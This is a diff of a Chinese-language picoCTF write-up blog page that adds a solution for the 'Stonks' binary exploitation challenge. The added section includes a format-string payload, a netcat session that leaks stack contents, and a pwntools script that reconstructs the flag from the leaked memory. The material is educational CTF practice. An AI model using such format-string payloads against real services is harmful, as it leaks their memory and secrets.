@@ -835,6 +835,9 @@ sock.close()
 <p>本來以為 <code>enc</code> 的檔案是要拿來執行的🥵　結果只是一個文字檔，看惹提示還是不懂🔧，只好去查別人的write🆙，原來題目的意思是檔案裡的字串是<code>flag</code> 經由下面ㄉPython程式轉換出來的，所以偶們要按照程式的規則推回去😰</p>
 <p>結果偶發現別人解答的程式跑惹會報錯，題目的轉換程式也是🥺，看起來問題是這些<code>unicode</code> 編碼的東西用 <code>Python</code> 的 <code>ord()</code> 轉出來剩下8bit但是實際上應該是16bit才對，提示又說需要找一些線上編碼的工具，所以偶先拿去<a target="_blank" rel="noopener" href="https://www.online-toolz.com/tools/text-unicode-entities-convertor.php">這個網頁</a>轉成樣子怪怪的十六進位數字編號，然後寫一個步驟相反的小Python🐍</p>
 <p>題目的Python會把 <code>flag</code> 兩個兩個字一組，第一個字左移8位（位元運算）然後轉成ASCII的數字編號　加上　轉成ASCII數字編號的第二個字，再把這個東西由數字編號轉成一個字元（不過偶的<code>chr()</code>是不能接收大於<code>256[8bit]</code>的參數na🥺🥺）。</p>
+<blockquote>
+<p>以　flag　的前兩個字舉例🤬</p>
+</blockquote>
 <table>
 <thead>
 <tr>
@@ -860,9 +863,6 @@ sock.close()
 </tbody>
 </table>
 <p>編號(28672 + 105)的 Unicode 應該會是<strong>灩</strong></p>
-<blockquote>
-<p>以　flag　的前兩個字舉例🤬</p>
-</blockquote>
 <p>所以逆著做就需要先把一個字變成兩個，用右移推出第一個字，第二個字偶是用取模把後8個bit用粗乃na，可能不是很好🤒🤒　然後再把它們各自轉回字元🙊　醬子應該就有答案惹💋</p>
 <pre><code class="language-python=">enc = "%u7069%u636F%u4354%u467B%u3136%u5F62%u6974%u735F%u696E%u7374%u3334%u645F%u6F66%u5F38%u5F65%u3134%u3161%u3066%u377D"
 enc = enc.split("%u")
@@ -870,6 +870,77 @@ for i in range(1, len(enc)):
     num = int(enc[i].lower(), 16)
     print(chr(num &gt;&gt; 8)+chr(num % (1 &lt;&lt; 8)), end="")
 
+</code></pre>
+<p>應該會有答案跑出來😲😲</p>
+<hr>
+<h2 id="👩‍🏭Stonks">👩‍🏭Stonks</h2>
+<ul>
+<li>Category: Binary Exploitation</li>
+<li>Score: 10</li>
+</ul>
+<h3 id="💁Description-v8">💁Description</h3>
+<p>I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn’t believe you if you told me it’s unsecure! <a target="_blank" rel="noopener" href="https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c">vuln.c</a> <code>nc mercury.picoctf.net 33411</code></p>
+<h3 id="🙆Solution-v8">🙆Solution</h3>
+<p>唉這個好難哇🥺🥺　這個題目叫偶們連到 <code>mercury.picoctf.net 33411</code> 它還有附這個程式　<code>vuln.c</code> ，要從裡面找到有問題的地方🤕　偶太呆只好去找別人的Write🆙，偶有看惹 <a target="_blank" rel="noopener" href="https://github.com/Kasimir123/CTFWriteUps/tree/main/2021-03-picoCTF/stonks">Kasimir123</a>　大大和 <a target="_blank" rel="noopener" href="https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Stonks.md">Dvd848</a> 大佬的，偶的程式是用他們的改的🤢</p>
+<p><code>vuln.c</code> 的問題在這裡：</p>
+<pre><code class="language-c=">char *user_buf = malloc(300 + 1);
+printf("What is your API token?\n");
+scanf("%300s", user_buf);
+printf("Buying stonks with token:\n");
+printf(user_buf);
+</code></pre>
+<p>在 <code>buy_stonks</code> 函式裡的 <code>printf</code> 少惹格式化字符串的參數，這個叫做 <code>Uncontrolled format string</code> 格式化字串漏洞的樣子，如果偶們使用 <code>%x</code> 或 <code>%X$p</code> (<code>X</code> 為任意正整數)，可以把堆疊上的資料打印出來。</p>
+<pre><code class="language-c=">char api_buf[FLAG_BUFFER];
+FILE *f = fopen("api","r");
+// ... 中間省略 ...
+fgets(api_buf, FLAG_BUFFER, f);
+</code></pre>
+<p>程式前面有把🏁 [api檔案] 讀到 <code>api_buf</code> 這個字串裡面，所以可以打出來😻 偶們先在 <code>terminal</code> 試試看🧑‍💻</p>
+<pre><code>&gt; nc mercury.picoctf.net 33411
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x 
+Buying stonks with token:
+919a3d0-804b000-80489c3-f7f02d80-ffffffff-1-9198160-f7f10110-f7f02dc7-0-9199180-1-919a3b0-919a3d0-6f636970-7b465443-306c5f49-345f7435
+Portfolio as of Sun Jun 20 10:23:09 UTC 2021
+
+
+1 shares of FZH
+2 shares of P
+2 shares of E
+73 shares of ZX
+41 shares of PNBU
+1707 shares of TXUL
+77 shares of YMA
+Goodbye!
+</code></pre>
+<p>不過 <strong>%</strong> 出來的東西是16進位的資料然後有八位，不過偶不知到為隔膜是八位，因為書裡面的有十六位，不過如果要把這些數字轉成字串的話可以用 <code>pwntool</code> 裡面的 <code>p32()</code>，如果有十六位就用 <code>p64()</code> ，它還會幫忙把字串倒過來，好像是因為Linux是小頭端的關西，這裡有危機百科的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F">大頭端和小頭端</a>。</p>
+<p>還有要注意的地方就是<code>pwntool</code> 的 <code>recvline</code> 回傳的資料是byte的型態所以要用<code>.decode()</code>才會變成字串ㄛ📫 <code>p32()</code>也是ㄛ🤭</p>
+<pre><code class="language-python=">from pwn import *
+
+flag = b''
+r = remote("mercury.picoctf.net", 33411)
+r.sendlineafter("What would you like to do?\n", "1")
+payload = "%x-" * 30
+r.sendlineafter("What is your API token?\n", payload)
+r.recvuntilS("Buying stonks with token:\n")
+out = r.recvline().decode()
+for d in out.split("-"):
+    try:
+        res = p32(int(d, 16))
+        flag += res
+    except Exception:
+        pass
+r.recvall()
+
+print(flag)
 </code></pre>
 <p>應該會有答案跑出來😲😲</p>
 
@@ -906,10 +977,10 @@ for i in range(1, len(enc)):
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-19T17:40:31+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-20T18:37:56+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新於：2021年6月19日</p>
+    <p>更新於：2021年6月20日</p>
   </a>
 </div>
 
@@ -1013,7 +1084,7 @@ for i in range(1, len(enc)):
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%BAObedient-Cat"><span class="toc-text">😺Obedient Cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%99%8AMod-26"><span class="toc-text">🙊Mod 26</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v2"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v2"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%8DPython-Wrangling"><span class="toc-text">🐍Python Wrangling</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v3"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v3"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%81Wave-a-flag"><span class="toc-text">🏁Wave a flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v4"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v4"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%81%E2%80%8Dinformation"><span class="toc-text">👁‍information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v5"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v5"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%BBNice-netcat%E2%80%A6"><span class="toc-text">😻Nice netcat…</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v6"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v6"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ADTransformation"><span class="toc-text">👩‍🏭Transformation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v7"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v7"><span class="toc-text">🙆Solution</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%BAObedient-Cat"><span class="toc-text">😺Obedient Cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%99%8AMod-26"><span class="toc-text">🙊Mod 26</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v2"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v2"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%90%8DPython-Wrangling"><span class="toc-text">🐍Python Wrangling</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v3"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v3"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%81Wave-a-flag"><span class="toc-text">🏁Wave a flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v4"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v4"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%81%E2%80%8Dinformation"><span class="toc-text">👁‍information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v5"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v5"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%98%BBNice-netcat%E2%80%A6"><span class="toc-text">😻Nice netcat…</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v6"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v6"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ADTransformation"><span class="toc-text">👩‍🏭Transformation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v7"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v7"><span class="toc-text">🙆Solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A9%E2%80%8D%F0%9F%8F%ADStonks"><span class="toc-text">👩‍🏭Stonks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%81Description-v8"><span class="toc-text">💁Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%99%86Solution-v8"><span class="toc-text">🙆Solution</span></a></li></ol></li></ol>
     </div>
   </section>
 
